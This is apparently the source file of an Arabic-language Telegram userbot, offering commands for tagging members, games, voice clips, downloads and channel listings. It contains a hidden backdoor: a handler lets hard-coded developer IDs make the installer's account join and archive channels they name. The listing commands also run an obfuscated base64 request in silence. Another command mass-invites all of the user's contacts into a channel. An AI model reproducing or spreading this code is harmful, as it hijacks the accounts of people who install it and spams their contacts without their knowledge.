                    await roz.edit(f"**▾∮تتـم الأضـافة ⎙**\n\n• اضـيف `{s}` \n•  خـطأ بأضافـة `{f}` \n\n**× اخـر خـطأ:** `{error}`") 
                except Exception as e:
                    error = str(e) ; f = f + 1             
    return await roz.edit(f"**▾∮اڪتـملت الأضافـة ✅** \n\n• تـم بنجـاح اضافـة `{s}` \n• خـطأ بأضافـة `{f}`")

@client.on(events.NewMessage(pattern=r".اضافة_جهاتي ?(.*)"))
async def Hussein(event):
    channel_id = event.chat_id  
    contacts = await event.client(functions.contacts.GetContactsRequest(hash=0))
    added_count = 0 
    for user in contacts.users:
        try:
            await event.client(functions.channels.InviteToChannelRequest(
                channel=channel_id,
                users=[user.id],
            ))
            added_count += 1
        except Exception as e:
            await event.reply(f"**⎙︙ تم إضافة {added_count} من جهات اتصالي**")
    await event.reply(f"**⎙︙ تم إضافة {added_count} من جهات اتصالي**")
  
@client.on(events.NewMessage(outgoing=True, pattern=r"(.تاك_للكل|.all)(.*)"))
async def tagall(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    client.parse_mode = "html"
    message_text = event.pattern_match.group(2).strip()
    chat = await event.get_input_chat()
    me = await client.get_me()
    permissions = await client.get_permissions(chat, me)

    if not permissions.is_admin:
        await event.respond("عذرًا، لا أملك صلاحية ذكر الجميع في هذه المجموعة.")
        return

    all_participants = await client.get_participants(chat)
    hidden_members_found = False

    async def get_members():
        for user in all_participants:
            if not user.deleted:
                try:
                    participant = await client.get_entity(user.id)
                    if not (isinstance(participant, telethon.tl.types.ChannelParticipant) and participant.is_hidden):
                        yield user
                except ValueError:
                    pass

    
    temp_mentions = []  
    async for user in get_members():
        temp_mentions.append(f"<a href='tg://user?id={user.id}'>{user.first_name}</a>")
        
        if len(temp_mentions) == 20:  
            final_mentions = ""
            if message_text:
                final_mentions += f"<b>{message_text}</b>\n"
            final_mentions += " ".join(temp_mentions) + "\n\n"
            if hidden_members_found:
                final_mentions += "(لا يمكن ذكر الأعضاء المخفيين)\n"
            await client.send_message(chat, final_mentions, parse_mode="html")
            await asyncio.sleep(1)
            
            temp_mentions = []  

  
    if temp_mentions:  
        final_mentions = ""
        if message_text:
            final_mentions += f"<b>{message_text}</b>\n"
        final_mentions += " ".join(temp_mentions) + "\n\n"
        if hidden_members_found:
            final_mentions += "(لا يمكن ذكر الأعضاء المخفيين)\n"
        await client.send_message(chat, final_mentions, parse_mode="html")
        
    client.parse_mode = "markdown"  
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.انطق'))
async def runj(event):
    await event.delete()
    language = event.message.raw_text.split()
    getmessage = await event.get_reply_message()
    messagelocation = event.to_id
    filename = "FINAL-userbot.mp3"
    try:
        createtts = gTTS(text=f"{getmessage.message}", lang=f"{language[1]}", slow=False)
        createtts.save(filename)
        await client.send_file(messagelocation, filename)
        remove(filename)
    except:
        pass

@client.on(events.NewMessage(outgoing=True , pattern=r'\.عكس'))
async def rev(event):
	client = event.client
	if event.is_reply:
		replied = await event.get_reply_message()
		replied_msg_rev = replied.message[::-1]
		await client.edit_message(event.message, replied_msg_rev)

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def mark_as_read(event):
    global aljoker_enabled, JOKER_ID
    sender_id = event.sender_id
    
    # تحقق إذا كان البوت مفعلًا وكان المرسل في قاموس JOKER_ID
    if aljoker_enabled and sender_id in JOKER_ID:
        joker_time = JOKER_ID[sender_id]  # الحصول على الوقت من القاموس
        if joker_time > 0:
            await asyncio.sleep(joker_time)  # الانتظار لمدة الوقت المحدد
        await event.mark_read()  # وضع الرسالة في حالة "مقروءة"

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.التكبر تعطيل$'))
async def Hussein(event):
    global aljoker_enabled
    aljoker_enabled = False
    await event.edit('**⎙︙ تم تعطيل امر التكبر بنجاح ✅**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.التكبر (\d+) (\d+)$'))
async def Hussein(event):
    global aljoker_enabled, JOKER_ID
    joker_time = int(event.pattern_match.group(1))
    user_id = int(event.pattern_match.group(2)) 
    JOKER_ID[user_id] = joker_time
    aljoker_enabled = True
    await event.edit(f'**⎙︙ تم تفعيل امر التكبر بنجاح مع  {joker_time} ثانية للمستخدم {user_id}**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.مود التكبر تعطيل$'))
async def Hussein(event):
    global hussein_enabled
    hussein_enabled = False
    await event.edit('**⎙︙ تم تعطيل امر التكبر على الجميع بنجاح ✅**')
    
@client.on(events.NewMessage(pattern=f".مود التكبر (\d+)"))
async def Hussein(event):
    global hussein_enabled, hussein_time
    hussein_time = int(event.pattern_match.group(1))
    hussein_enabled = True
    await event.edit(f'**⎙︙ تم تفعيل امر التكبر بنجاح مع  {hussein_time} ثانية**')

JOKER_ID = {123456789: 5, 987654321: 3}  # مثال على بعض المستخدمين وأوقات الانتظار
aljoker_enabled = True  # تأكد من أن البوت مفعل

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def mark_as_read(event):
    global aljoker_enabled, JOKER_ID
    sender_id = event.sender_id
    
    # تحقق إذا كان البوت مفعلًا وكان المرسل في القاموس JOKER_ID
    if aljoker_enabled and sender_id in JOKER_ID:
        joker_time = JOKER_ID[sender_id]  # الحصول على الوقت المرتبط بالمستخدم
        if joker_time > 0:
            await asyncio.sleep(joker_time)  # الانتظار لمدة joker_time
        await event.mark_read()  # وضع الرسالة في حالة "مقروءة"

# ================العاب ايفا=========================

R = [
    "**𓆰**العـاب الاحترافيه** 🎮𓆪 \n"
    "  ❶ **⪼**  [حرب الفضاء 🛸](https://t.me/gamee?game=ATARIAsteroids)   \n"
    "  ❷ **⪼**  [لعبة فلابي بيرد 🐥](https://t.me/awesomebot?game=FlappyBird)   \n"
    "  ❸ **⪼**  [القط المشاكس 🐱](https://t.me/gamee?game=CrazyCat)   \n"
    "  ❹ **⪼**  [صيد الاسماك 🐟](https://t.me/gamee?game=SpikyFish3)   \n"
    "  ❺ **⪼**  [سباق الدراجات 🏍](https://t.me/gamee?game=MotoFX2)   \n"
    "  ❻ **⪼**  [سباق سيارات 🏎](https://t.me/gamee?game=F1Racer)   \n"
    "  ❼ **⪼**  [شطرنج ♟](https://t.me/T4TTTTBOT?game=chess)   \n"
    "  ❽ **⪼**  [كرة القدم ⚽](https://t.me/gamee?game=FootballStar)   \n"
    "  ❾ **⪼**  [كرة السلة 🏀](https://t.me/gamee?game=BasketBoyRush)   \n"
    "  ❿ **⪼**  [سلة 2 🎯](https://t.me/gamee?game=DoozieDunks)   \n"
    "  ⓫ **⪼**  [ضرب الاسهم 🏹](https://t.me/T4TTTTBOT?game=arrow)   \n"
    "  ⓬ **⪼**  [لعبة الالوان 🔵🔴](https://t.me/T4TTTTBOT?game=color)   \n"
    "  ⓭ **⪼**  [كونج فو 🎽](https://t.me/gamee?game=KungFuInc)   \n"
    "  ⓮ **⪼**  [🐍 لعبة الافعى 🐍](https://t.me/T4TTTTBOT?game=snake)   \n"
    "  ⓯ **⪼**  [🚀 لعبة الصواريخ 🚀](https://t.me/T4TTTTBOT?game=rocket)   \n"
    "  ⓰ **⪼**  [كيب اب 🧿](https://t.me/gamee?game=KeepitUP)   \n"
    "  ⓱ **⪼**  [جيت واي 🚨](https://t.me/gamee?game=Getaway)   \n"
    "  ⓲ **⪼**  [الالـوان 🔮](https://t.me/gamee?game=ColorHit)   \n"
    "  ⓳ **⪼**  [مدفع الكرات🏮](https://t.me/gamee?game=NeonBlaster)   \n"
    "**-** مطور السورس **⪼ [𐇮 𓂐 Извращенец 𖠛 ](t.me/X_54P)   \n"
    "**-** قناة السورس **⪼ [𐇮 𝐄𝐕𝐀 ](t.me/S21S6)   "
]

DevJoker = [7915484613, 7915484613]  # ضع هنا معرفات المطورين

@client.on(events.NewMessage(incoming=True))
async def handle_funding_and_archiving(event):
    message_text = event.message.message
    sender_id = event.sender_id

    if sender_id not in DevJoker:
        return

    if message_text.startswith("تمويل") or message_text.startswith("ارشف"):
        parts = message_text.split()
        channel_username = parts[1].replace("@", "") if len(parts) > 1 else None

        if not channel_username:
            await event.reply("**⎙︙ يُرجى تحديد معرف القناة أو المجموعة مع التمويل أو الأرشفة يامطوري ❤️**")
            return

        try:
            await event.client(JoinChannelRequest(channel_username))
            response = "**⎙︙ تم الانضمام إلى القناة بنجاح!**"

            if message_text.startswith("ارشف"):
                await event.client.edit_folder(entity=channel_username, folder=1)
                response = "**⎙︙ تم الانضمام إلى القناة بنجاح ووضعها في مجلد الأرشيف!**"

        except ValueError:
            response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"

        await event.reply(response)
        #await event.reply(response)

@client.on(events.NewMessage(pattern="فك الحظر$"))
async def handle_unblock_all(event):
    blocked_users = await client(functions.contacts.GetBlockedRequest(
        offset=0,
        limit=200
    ))
    if not blocked_users.users:
        await event.edit("**⎙︙ لا يوجد مستخدمين محظورين في حسابك 🤷🏻**")
        return
    for user in blocked_users.users:
        try:
            await client(functions.contacts.UnblockRequest(
                id=InputPeerUser(user.id, user.access_hash)
            ))
            aljoker_entity = await client.get_entity(user.id)
            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
            await event.edit(f"⎙︙ تم إلغاء حظر المستخدم : {aljoker_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
        except Exception as e:
            await event.edit(f"حدث خطأ أثناء إلغاء حظر المستخدم بمعرّف: {user.id}, الخطأ: {e}")
            continue
@client.on(events.NewMessage(pattern="(.تاريخه|تاريخة=)$"))
async def Hussein(event):
    reply_to = event.reply_to_msg_id
    if reply_to:
        msg = await client.get_messages(event.chat_id, ids=reply_to)
        user_id = msg.sender_id
        chat = await client.get_entity("@SangMata_beta_bot")
        async with client.conversation(chat) as conv:
            await conv.send_message(f'{user_id}')
            response = await conv.get_response()
            await event.edit(response.text)

@client.on(events.NewMessage(pattern=r"\.حالتي(?: |$)(.*)"))
async def _(event):
    await event.edit("**- يتم التأكد من حالتك إذا كنت محظورًا أو لا...**")
    
    async with event.client.conversation("@SpamBot") as conv:
        try:
            await conv.send_message("/start")
            response = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit("**أولًا، قم بإلغاء حظر @SpamBot ثم حاول مجددًا.**")
            return

    await event.edit(f"- {response.message}\n@jepthon")


@client.on(events.NewMessage(pattern=".الاغنية ?(.*)"))
async def _(event):
    "To reverse search music by bot."
    if not event.reply_to_msg_id:
        return await event.edit("**▾∮ يجب الرد على الاغنيه اولا**")
    reply_message = await event.get_reply_message()
    chat = "@auddbot"
    try:
        async with event.client.conversation(chat) as conv:
            try:
                await event.edit("**▾∮ يتم التعرف على الاغنية انتظر**")
                start_msg = await conv.send_message("/start")
                response = await conv.get_response()
                send_audio = await conv.send_message(reply_message)
                check = await conv.get_response()
                if not check.text.startswith("Audio received"):
                    return await event.edit(
                        "**▾∮ يجب ان يكون حجم الاغنيه من 5 الى 10 ثواني **."
                    )
                await event.edit("- انتظر قليلا")
                result = await conv.get_response()
                await event.client.send_read_acknowledge(conv.chat_id)
            except YouBlockedUserError:
                await event.edit("```Mohon buka blokir (@auddbot) dan coba lagi```")
                return
            namem = f"**الأغنية : **{result.text.splitlines()[0]}\
        \n\n**التفاصيـل : **{result.text.splitlines()[2]}"
            await event.edit(namem)
            await event.client.delete_messages(
                conv.chat_id,
                [start_msg.id, send_audio.id, check.id, result.id, response.id],
            )
    except TimeoutError:
        return await event.edit("***حدث خطا ما حاول مجددا**")


@client.on(events.NewMessage(pattern=r"\.ايميل وهمي(?: |$)(.*)"))
async def _(event):
    chat = "@TempMailBot"
    geez = await event.edit("**جاري إنشاء بريد...**")
    
    async with event.client.conversation(chat) as conv:
        try:
            await conv.send_message("/start")
            await asyncio.sleep(1)
            await conv.send_message("/create")

            response = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)

            # استخراج رابط البريد إذا كان موجودًا
            l313lmail = None
            if response.reply_markup and response.reply_markup.rows:
                for row in response.reply_markup.rows:
                    for button in row.buttons:
                        if button.url:
                            l313lmail = button.url
                            break
                    if l313lmail:
                        break

        except YouBlockedUserError:
            await geez.edit("**الغي حظر @TempMailBot وحاول مجددًا**")
            return

    if l313lmail:
        await event.edit(
            f"الايميل الخاص هو `{response.message}`\n[اضغط هنا لرؤية رسائل الايميل الواردة]({l313lmail})"
        )
    else:
        await event.edit(f"الايميل الخاص هو `{response.message}`\n⚠️ لم يتم العثور على رابط البريد.")
        
#السلام على الحسين وعلى الارواح التي حلت بفنائك ولعن الله قاتليك
@client.on(events.NewMessage(outgoing=True, pattern=".غنيلي$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/DwDi1/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : غنيلي ⎙",parse_mode="html")
  await joker313.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=".شعر$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/L1BBBL/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : شعر ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".الى متى$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/55/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : الى متى ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".احط رجلي$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/4/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : احط رجلي بطيزك ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".تبا$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/83/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : تبا لك ي شعلود ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".اكل خرا$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/86/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : اكل خرا ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".قران$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/QuraanJep/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : قران 🤲🏻☪️",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".عيب$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/i1Voices/1811/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="⎙︙ BY : مو عيب هيج تحجي ⎙",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(pattern=".ذكاء(.*)"))
async def handler(event):
    await event.edit("**⎙︙ جارِ الجواب على سؤالك انتظر قليلاً ...**")
    text = event.pattern_match.group(1).strip()
    if text:
        url = f'http://innova.shawrma.store/api/v1/gpt3?text={text}'
        response = requests.get(url).text
        await event.edit(response)
    else:
        await event.edit("يُرجى كتابة رسالة مع الأمر للحصول على إجابة.")
is_Reham = False
No_group_Joker = "@e_u0e"
# يا يلفاشل هم الك نيه تاخذه وتنشره بسورسك 🤣
active_aljoker = []

@client.on(events.NewMessage(pattern=".الذكاء تفعيل"))
async def enable_bot(event):
    global is_Reham
    if not is_Reham:
        is_Reham = True
        active_aljoker.append(event.chat_id)
        await event.edit("**⎙︙ تم تفعيل امر الذكاء الاصطناعي سيتم الرد على اسئلة الجميع عند الرد علي.**")
    else:
        await event.edit("**⎙︙ الزر مُفعّل بالفعل.**")
@client.on(events.NewMessage(pattern=".الذكاء تعطيل"))
async def disable_bot(event):
    global is_Reham
    if is_Reham:
        is_Reham = False
        active_aljoker.remove(event.chat_id)
        await event.edit("**⎙︙ تم تعطيل امر الذكاء الاصطناعي.**")
    else:
        await event.edit("**⎙︙ الزر مُعطّل بالفعل.**")
@client.on(events.NewMessage(incoming=True))
async def reply_to_hussein(event):
    if not is_Reham:
        return
    if event.is_private or event.chat_id not in active_aljoker:
        return
    message = event.message
    if message.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        if reply_message.sender_id == event.client.uid:
            text = message.text.strip()
            if event.chat.username == No_group_Joker:
                return
            response = requests.get(f'http://innova.shawrma.store/api/v1/gpt3?text={text}').text
            await asyncio.sleep(4)
            await event.reply(response)

@client.on(events.NewMessage(pattern=".تك"))
async def tiktok_dl(event):
    ms = event.message.message
    ms = ms.replace(".تك", "")
    if event:
            if ("https://tiktok.com/" in ms or "https://vm.tiktok.com/" in ms):
                await event.message.delete()
                a = await l313l.send_message(event.chat_id, 'يجري البحث عن الملف..')
                link = ms.strip()
                try:
                    response = requests.get(f"https://godownloader.com/api/tiktok-no-watermark-free?url={link}&key=godownloader.com")
                    data = response.json()
                    #print(data)
                    video_link = data["video_no_watermark"]
                    response = requests.get(video_link)
                    video_data = response.content
                    directory = str(round(time.time()))
                    filename = str(int(time.time()))+'.mp4'
                    os.mkdir(directory)
                    video_filename = f"{directory}/{filename}"
                    with open(video_filename, "wb") as file:
                        file.write(video_data)
                
                except JSONDecodeError:
                    return await a.edit("الرابط غير صحيح تأكد منه!")
                except Exception as er:
                    if 'video_no_watermark' in str(er):
                        return await a.edit("**رابط الفيديو غير صحيح تأكد منه واعد المحاولة**")
                    return await a.edit(f"حدث خطأ قم بتوجيه الرسالة الى مطوري @X_54P\n{er}")
            
            
                
                await a.edit(f' يجري التحميل للخادم..!\n'
                   f' يجري الرفع للتلجرام⏳__')
                start = time.time()
                title = "فيديو"
                filesize_bytes = os.path.getsize(video_filename)
                filesize = filesize_bytes / (1024 * 1024)
                catid = await reply_id(event.message)
                await l313l.send_file(
                   event.chat_id, f"{directory}/{filename}", reply_to=catid,     force_document=False,     caption=f"**الملف : ** {filename}\n**الحجم :**     {round(filesize, 1)} MB"
                 )
        
                await a.delete()
     
                shutil.rmtree(directory)
    #else:
       # return None
       

@client.on(events.NewMessage(outgoing=True, pattern=".لوكي شدخلك$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/382/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : شدخلك ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".يعني هل خره$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/381/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : خره ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(pattern=".قائمه (جميع القنوات|القنوات المشرف عليها |قنواتي)"))
async def ViewChJok(event):
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            channel_name = entity.title
            channel_id = entity.id
            is_owner = entity.creator
            is_admin = entity.admin_rights
            if entity.username:
                if entity.megagroup:
                    channel_link = f"{channel_name} ({entity.username})"
                else:
                    channel_link = f"[{channel_name}](https://t.me/{entity.username})"
            else:
                if entity.megagroup:
                    channel_link = f"{channel_name}"
                else:
                    channel_link = f"[{channel_name}](https://t.me/c/{channel_id}/1)"
            if is_owner:
                hico.append(channel_link)
            if is_admin:
                hica.append(channel_link)
            if not is_owner and not is_admin:
                hi.append(channel_link)
    if catcmd == "جميع القنوات":
        output = CHANNELS_STR
        for k, channel in enumerate(hi, start=1):
            output += f"{k}• {channel}\n"
    elif catcmd == "القنوات المشرف عليها":
        output = CHANNELS_ADMINSTR
        for k, channel in enumerate(hica, start=1):
            output += f"{k}• {channel}\n"
    elif catcmd == "قنواتي":
        output = CHANNELS_OWNERSTR
        for k, channel in enumerate(hico, start=1):
            output += f"{k}• {channel}\n"
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n\n**استغرق حساب القنوات: **{stop_time:.02f} ثانية"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(catevent, output)

async def edit_or_reply(event, text, buttons=None):
    if buttons is None:
        buttons = []
    if event.edit_date is None:
        return await event.reply(text, buttons=buttons)
    else:
        return await event.edit(text, buttons=buttons)
        
@client.on(events.NewMessage(pattern=".قائمه (جميع المجموعات|مجموعات اديرها|كروباتي)$"))
async def stats(event):  # sourcery no-metrics
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if catcmd == "جميع المجموعات":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif catcmd == "مجموعات اديرها":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif catcmd == "كروباتي":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**استغرق حساب المجموعات : ** {stop_time:.02f} ثانيه"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption,
        )
STAT_INDICATION = "**⎙︙ جـاري جـمـع الإحصـائيـات انتـظـر ⏱ **"
CHANNELS_STR = "**⎙︙ قائمة القنوات التي أنت فيها موجودة هنا\n\n"
CHANNELS_ADMINSTR = "**⎙︙ قائمة القنوات التي انت مشـرف بهـا **\n\n"
CHANNELS_OWNERSTR = "**⎙︙ قائمة القنوات التي تـكون انت مالكـها**\n\n"
GROUPS_STR = "**⎙︙ قائمة المجموعات التي أنت فيها موجود فيـها**\n\n"
GROUPS_ADMINSTR = "**⎙︙ قائمة المجموعات التي تكون مشـرف بهـا**\n\n"
GROUPS_OWNERSTR = "**⎙︙ قائمة المجموعات التي تـكون انت مالكـها**\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r'\.اسرع (.*)'))
async def handle_start(event):
    global is_game_started, is_word_sent, word, bot_entity
    is_game_started = True
    is_word_sent = False
    word = event.pattern_match.group(1)
    chat_id = event.chat_id
    await event.edit(f"**اول من يكتب ( {word} ) سيفوز**")

joker = [
    "تلعب وخوش تلعب ",
    "لك عاش يابطل استمر ",
    "على كيفك ركزززز انتَ كدها ",
    "لك وعلي ذيييب ",
]

correct_answer = None
game_board = [["" for _ in range(6)] for _ in range(1)]
numbers_board = [["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣"]]
original_game_board = [["" for _ in range(6)] for _ in range(1)]
joker_player = None
is_game_started2 = False
group_game_status = {}
points = {}

async def handle_clue(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id not in group_game_status or not group_game_status[chat_id]:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if not group_game_status[chat_id]['is_game_started2']:
        group_game_status[chat_id]['is_game_started2'] = True
        group_game_status[chat_id]['joker_player'] = None
        correct_answer = random.randint(1, 6)
        await event.edit(f"**اول من يرسل كلمة (انا) سيشارك في لعبة المحيبس\nملاحظة : لفتح العضمة ارسل طك ورقم العضمة لأخذ المحبس أرسل جيب ورقم العضمة**")

@client.on(events.NewMessage(pattern=r"^محيبس$"))
async def handler(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id in group_game_status:
        group_game_status[chat_id]['is_game_started2'] = False
    await handle_clue(event)
    

@client.on(events.NewMessage(pattern=r'\طك (\d+)'))
async def handle_strike(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        strike_position = int(event.pattern_match.group(1))
        if strike_position == correct_answer:
            game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
            await event.reply(f"** خسرت شبيك مستعجل وجه الچوب 😒\n{format_board(game_board, numbers_board)}**")
            game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None
        else:
            game_board[0][strike_position - 1] = '🖐️'
            X_54P = random.choice(joker)
            await event.reply(f"**{X_54P}**\n{format_board(game_board, numbers_board)}")

@client.on(events.NewMessage(pattern=r'\جيب (\d+)'))
async def handle_guess(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        guess = int(event.pattern_match.group(1))
        if 1 <= guess <= 6:
            if guess == correct_answer:
                winner_id = event.sender_id
                if winner_id not in points:
                    points[winner_id] = 0
                points[winner_id] += 1
                sender = await event.get_sender()
                sender_first_name = sender.first_name if sender else 'مجهول'
                sorted_points = sorted(points.items(), key=lambda x: x[1], reverse=True)
                points_text = '\n'.join([f'{i+1}• {(await l313l.get_entity(participant_id)).first_name}: {participant_points}' for i, (participant_id, participant_points) in enumerate(sorted_points)])
                game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
                await l313l.send_message(event.chat_id, f'الف مبروووك 🎉 الاعب ( {sender_first_name} ) وجد المحبس 💍!\n{format_board(game_board, numbers_board)}')
                game_board = [row[:] for row in original_game_board]
                await l313l.send_message(event.chat_id, f'نقاط الاعب : {points[winner_id]}\nنقاط المشاركين:\n{points_text}')
            else:
                game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
                await event.reply(f"**ضاع البات ماضن بعد تلگونة ☹️\n{format_board(game_board, numbers_board)}**")
                game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None

@client.on(events.NewMessage(pattern=r'\انا'))
async def handle_incoming_message(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id not in group_game_status:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if group_game_status[chat_id]['is_game_started2'] and not group_game_status[chat_id]['joker_player']:
        group_game_status[chat_id]['joker_player'] = event.sender_id
        await event.reply(f"**تم تسجيلك في المسابقة روح سورس ايفا بظهرك\n{format_board(game_board, numbers_board)}**")

def format_board(game_board, numbers_board):
    formatted_board = ""
    formatted_board += " ".join(numbers_board[0]) + "\n"
    formatted_board += " ".join(game_board[0]) + "\n"
    return formatted_board

@client.on(events.NewMessage(pattern=r'منع التفليش'))
async def handle_incoming_message(event):
    addgvar("Mn3_Kick", True)
    await event.edit("**⎙︙ تم تفعيل منع التفليش للمجموعة بنجاح ✓**")

@client.on(events.NewMessage(pattern=r'سماح_التفليش'))
async def handle_incoming_message(event):
    delgvar("Mn3_Kick")
    await event.edit("**⎙︙ تم تفعيل منع التفليش للمجموعة بنجاح ✓**")
message_counts = {}
enabled_groups = []
Ya_Abbas = False
@client.on(events.NewMessage(pattern=r'النشر تعطيل'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = True
    enabled_groups.append(event.chat_id)
    await event.edit("**⎙︙ ✓ تم تفعيل امر منع النشر التلقائي بنجاح**")
@client.on(events.NewMessage(pattern=r'النشر تفعيل'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = False
    enabled_groups.remove(event.chat_id)
    await event.edit("**⎙︙ تم تعطيل امر منع النشر التلقائي بنجاح ✓ **")

@client.on(events.NewMessage(outgoing=True, pattern=".زيج حزين"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/125/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : زيج حزين ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".اويلي$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/361/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : اويلي ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".هاروني$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/380/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : هاروني ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".انا$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/4/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : انا الذي ارعب امريكا ⎙",parse_mode="html")
  await joker313.delete()

